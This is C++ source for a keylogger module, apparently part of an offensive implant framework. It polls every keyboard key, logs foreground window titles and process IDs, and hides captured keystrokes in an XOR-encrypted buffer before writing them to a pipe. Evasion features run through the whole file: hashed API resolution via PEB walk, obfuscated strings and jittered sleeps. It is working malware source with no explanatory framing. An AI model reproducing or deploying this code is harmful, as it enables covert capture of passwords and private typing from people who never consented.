#include "Keylogger.h"
#include "ApiLoader.h"
#include "ProcLoader.h"
#include "ApiDefines.h"
#include "DebugLog.h"
#include "Obfuscate.h"
#include "utils.h"
#include "WaitMask.h"

// ─── user32 function typedefs ───────────────────────────────────────────────

typedef SHORT (WINAPI *fnGetAsyncKeyState)(int vKey);
typedef BOOL  (WINAPI *fnGetKeyboardState)(PBYTE lpKeyState);
typedef int   (WINAPI *fnToUnicode)(UINT wVirtKey, UINT wScanCode, const BYTE *lpKeyState,
                                     LPWSTR pwszBuff, int cchBuff, UINT wFlags);
typedef UINT  (WINAPI *fnMapVirtualKeyW)(UINT uCode, UINT uMapType);
typedef HWND  (WINAPI *fnGetForegroundWindow)(void);
typedef int   (WINAPI *fnGetWindowTextW)(HWND hWnd, LPWSTR lpString, int nMaxCount);
typedef DWORD (WINAPI *fnGetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);

struct User32Api {
    fnGetAsyncKeyState          GetAsyncKeyState;
    fnGetKeyboardState          GetKeyboardState;
    fnToUnicode                 ToUnicode;
    fnMapVirtualKeyW            MapVirtualKeyW;
    fnGetForegroundWindow       GetForegroundWindow;
    fnGetWindowTextW            GetWindowTextW;
    fnGetWindowThreadProcessId  GetWindowThreadProcessId;
};

// ─── XOR buffer helpers ─────────────────────────────────────────────────────

#define KEYLOG_BUFFER_SIZE  4096
#define KEYLOG_FLUSH_THRESH 256
#define XOR_KEY_LEN         16
#define TITLE_INTERVAL_MS   30000

static void XorBuffer(BYTE* buf, ULONG len, BYTE* key, ULONG keyLen)
{
    for (ULONG i = 0; i < len; i++)
        buf[i] ^= key[i % keyLen];
}

static BOOL FlushBuffer(BYTE* buf, ULONG* pLen, BYTE* xorKey, HANDLE pipeWrite)
{
    if (*pLen == 0)
        return TRUE;

    // Decrypt in place
    XorBuffer(buf, *pLen, xorKey, XOR_KEY_LEN);

    // Write cleartext to pipe
    DWORD written = 0;
    BOOL ok = ApiWin->WriteFile(pipeWrite, buf, *pLen, &written, NULL);

    // Zero and reset
    memset(buf, 0, *pLen);
    *pLen = 0;

    // Rotate XOR key
    GenerateRandomBytes(xorKey, XOR_KEY_LEN);

    return ok;
}

static void BufferAppend(BYTE* buf, ULONG* pLen, const BYTE* data, ULONG dataLen,
                         BYTE* xorKey, HANDLE pipeWrite)
{
    ULONG remaining = dataLen;
    const BYTE* src = data;

    while (remaining > 0) {
        ULONG space = KEYLOG_BUFFER_SIZE - *pLen;
        ULONG chunk = (remaining < space) ? remaining : space;

        // XOR encrypt into buffer
        for (ULONG i = 0; i < chunk; i++) {
            buf[*pLen + i] = src[i] ^ xorKey[(*pLen + i) % XOR_KEY_LEN];
        }
        *pLen += chunk;
        src += chunk;
        remaining -= chunk;

        // Flush if buffer full or above threshold
        if (*pLen >= KEYLOG_FLUSH_THRESH) {
            FlushBuffer(buf, pLen, xorKey, pipeWrite);
        }
    }
}

static void BufferAppendStr(BYTE* buf, ULONG* pLen, const char* str,
                            BYTE* xorKey, HANDLE pipeWrite)
{
    BufferAppend(buf, pLen, (const BYTE*)str, StrLenA(str), xorKey, pipeWrite);
}

// ─── Resolve user32 APIs via PEB walk ───────────────────────────────────────

static BOOL ResolveUser32(User32Api* api)
{
    memset(api, 0, sizeof(User32Api));

    // Try PEB walk first (user32 may already be loaded)
    HMODULE hUser32 = GetModuleAddress(HASH_LIB_USER32);
    DBG("[keylog] PEB walk user32: %p", hUser32);

    // Fallback: load it
    if (!hUser32) {
        auto _u32 = OBF("user32.dll");
        hUser32 = ApiWin->LoadLibraryA(_u32);
        DBG("[keylog] LoadLibrary user32: %p", hUser32);
    }

    if (!hUser32) {
        DBG("[keylog] FAIL: user32 not found");
        return FALSE;
    }

    api->GetAsyncKeyState         = (fnGetAsyncKeyState)        GetSymbolAddress(hUser32, HASH_FUNC_GETASYNCKEYSTATE);
    api->GetKeyboardState         = (fnGetKeyboardState)        GetSymbolAddress(hUser32, HASH_FUNC_GETKEYBOARDSTATE);
    api->ToUnicode                = (fnToUnicode)               GetSymbolAddress(hUser32, HASH_FUNC_TOUNICODE);
    api->MapVirtualKeyW           = (fnMapVirtualKeyW)          GetSymbolAddress(hUser32, HASH_FUNC_MAPVIRTUALKEYW);
    api->GetForegroundWindow      = (fnGetForegroundWindow)     GetSymbolAddress(hUser32, HASH_FUNC_GETFOREGROUNDWINDOW);
    api->GetWindowTextW           = (fnGetWindowTextW)          GetSymbolAddress(hUser32, HASH_FUNC_GETWINDOWTEXTW);
    api->GetWindowThreadProcessId = (fnGetWindowThreadProcessId)GetSymbolAddress(hUser32, HASH_FUNC_GETWINDOWTHREADPROCESSID);

    DBG("[keylog] APIs: AsyncKey=%p KbState=%p ToUni=%p MapVK=%p FgWnd=%p WndTxt=%p",
        api->GetAsyncKeyState, api->GetKeyboardState, api->ToUnicode,
        api->MapVirtualKeyW, api->GetForegroundWindow, api->GetWindowTextW);

    // Verify critical APIs
    if (!api->GetAsyncKeyState || !api->GetKeyboardState || !api->ToUnicode || !api->MapVirtualKeyW) {
        DBG("[keylog] FAIL: critical API missing");
        return FALSE;
    }

    return TRUE;
}

// ─── Process individual key press ───────────────────────────────────────────

static void ProcessKey(User32Api* api, int vk, BYTE* buf, ULONG* pLen,
                       BYTE* xorKey, HANDLE pipeWrite)
{
    // Ignore modifier keys
    if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT ||
        vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
        vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ||
        vk == VK_CAPITAL || vk == VK_NUMLOCK || vk == VK_SCROLL)
        return;

    // Special keys
    switch (vk) {
    case VK_RETURN:  BufferAppendStr(buf, pLen, "[RET]\n", xorKey, pipeWrite); return;
    case VK_BACK:    BufferAppendStr(buf, pLen, "[BS]",    xorKey, pipeWrite); return;
    case VK_TAB:     BufferAppendStr(buf, pLen, "[TAB]",   xorKey, pipeWrite); return;
    case VK_ESCAPE:  BufferAppendStr(buf, pLen, "[ESC]",   xorKey, pipeWrite); return;
    case VK_DELETE:  BufferAppendStr(buf, pLen, "[DEL]",   xorKey, pipeWrite); return;
    case VK_LEFT:    BufferAppendStr(buf, pLen, "[<]",     xorKey, pipeWrite); return;
    case VK_RIGHT:   BufferAppendStr(buf, pLen, "[>]",     xorKey, pipeWrite); return;
    case VK_UP:      BufferAppendStr(buf, pLen, "[UP]",    xorKey, pipeWrite); return;
    case VK_DOWN:    BufferAppendStr(buf, pLen, "[DN]",    xorKey, pipeWrite); return;
    case VK_SPACE:   BufferAppendStr(buf, pLen, " ",       xorKey, pipeWrite); return;
    default: break;
    }

    // Printable: use GetKeyboardState + ToUnicode
    BYTE kbState[256];
    if (!api->GetKeyboardState(kbState))
        return;

    UINT scanCode = api->MapVirtualKeyW(vk, 0); // MAPVK_VK_TO_VSC
    WCHAR unicodeBuf[4] = { 0 };
    int result = api->ToUnicode(vk, scanCode, kbState, unicodeBuf, 4, 0);

    if (result > 0) {
        // Convert to UTF-8
        char utf8Buf[16] = { 0 };
        int utf8Len = ApiWin->WideCharToMultiByte(CP_UTF8, 0, unicodeBuf, result,
                                                   utf8Buf, sizeof(utf8Buf) - 1, NULL, NULL);
        if (utf8Len > 0) {
            BufferAppend(buf, pLen, (BYTE*)utf8Buf, utf8Len, xorKey, pipeWrite);
        }
    }
    // result == 0 or < 0 (dead key): ignore
}

// ─── Process window title change ────────────────────────────────────────────

static void ProcessWindowTitle(User32Api* api, HWND* pLastHwnd, BYTE* buf, ULONG* pLen,
                               BYTE* xorKey, HANDLE pipeWrite)
{
    if (!api->GetForegroundWindow || !api->GetWindowTextW)
        return;

    HWND fg = api->GetForegroundWindow();
    if (!fg || fg == *pLastHwnd)
        return;

    *pLastHwnd = fg;

    // Get PID
    DWORD pid = 0;
    if (api->GetWindowThreadProcessId)
        api->GetWindowThreadProcessId(fg, &pid);

    // Get window title (wide)
    WCHAR titleW[256] = { 0 };
    int titleLen = api->GetWindowTextW(fg, titleW, 255);
    if (titleLen <= 0)
        return;

    // Convert to UTF-8
    char titleUtf8[512] = { 0 };
    int utf8Len = ApiWin->WideCharToMultiByte(CP_UTF8, 0, titleW, titleLen,
                                               titleUtf8, sizeof(titleUtf8) - 1, NULL, NULL);
    if (utf8Len <= 0)
        return;

    // Format: \n[PID:1234] Window Title\n
    char header[600] = { 0 };
    ApiWin->snprintf(header, sizeof(header) - 1, "\n[PID:%lu] ", pid);
    BufferAppendStr(buf, pLen, header, xorKey, pipeWrite);
    BufferAppend(buf, pLen, (BYTE*)titleUtf8, utf8Len, xorKey, pipeWrite);
    BufferAppendStr(buf, pLen, "\n", xorKey, pipeWrite);
}

// ─── Worker thread entry point ──────────────────────────────────────────────

DWORD WINAPI KeylogWorker(LPVOID lpParam)
{
    KeylogConfig* cfg = (KeylogConfig*)lpParam;
    if (!cfg || !cfg->pipeWrite) {
        DBG("[keylog] FAIL: invalid config or pipe");
        return 1;
    }

    DBG("[keylog] Worker started, pipe=%p, poll=%lu ms", cfg->pipeWrite, cfg->pollIntervalMs);

    // Resolve user32 APIs
    User32Api u32;
    if (!ResolveUser32(&u32)) {
        DBG("[keylog] FAIL: ResolveUser32 failed");
        memset(&u32, 0, sizeof(u32));
        return 2;
    }

    // Allocate encrypted buffer on heap (zeroed)
    BYTE* buffer = (BYTE*)MemAllocLocal(KEYLOG_BUFFER_SIZE);
    if (!buffer) {
        DBG("[keylog] FAIL: buffer alloc failed");
        memset(&u32, 0, sizeof(u32));
        return 3;
    }
    ULONG bufLen = 0;
    DBG("[keylog] Polling loop starting...");

    // Generate XOR key
    BYTE xorKey[XOR_KEY_LEN];
    GenerateRandomBytes(xorKey, XOR_KEY_LEN);

    // Window title tracking
    HWND lastHwnd = NULL;
    ULONG titleCounter = 0;
    ULONG titleCheckInterval = TITLE_INTERVAL_MS / (cfg->pollIntervalMs ? cfg->pollIntervalMs : 100);

    // Main polling loop
    while (InterlockedCompareExchange(&cfg->active, 1, 1) == 1) {

        // Poll all virtual keys
        for (int vk = 0x08; vk <= 0xFE; vk++) {
            SHORT state = u32.GetAsyncKeyState(vk);
            if (state & 0x0001) {
                ProcessKey(&u32, vk, buffer, &bufLen, xorKey, cfg->pipeWrite);
            }
        }

        // Periodic window title check
        titleCounter++;
        if (titleCounter >= titleCheckInterval) {
            titleCounter = 0;
            ProcessWindowTitle(&u32, &lastHwnd, buffer, &bufLen, xorKey, cfg->pipeWrite);
        }

        // Jittered sleep
        ULONG sleepMs = cfg->pollIntervalMs + (GenerateRandom32() % 50);
        mySleep(sleepMs);
    }

    // Flush remaining data
    FlushBuffer(buffer, &bufLen, xorKey, cfg->pipeWrite);

    // Cleanup: zero sensitive data
    memset(xorKey, 0, XOR_KEY_LEN);
    memset(&u32, 0, sizeof(u32));
    MemFreeLocal((LPVOID*)&buffer, KEYLOG_BUFFER_SIZE);

    return 0;
}
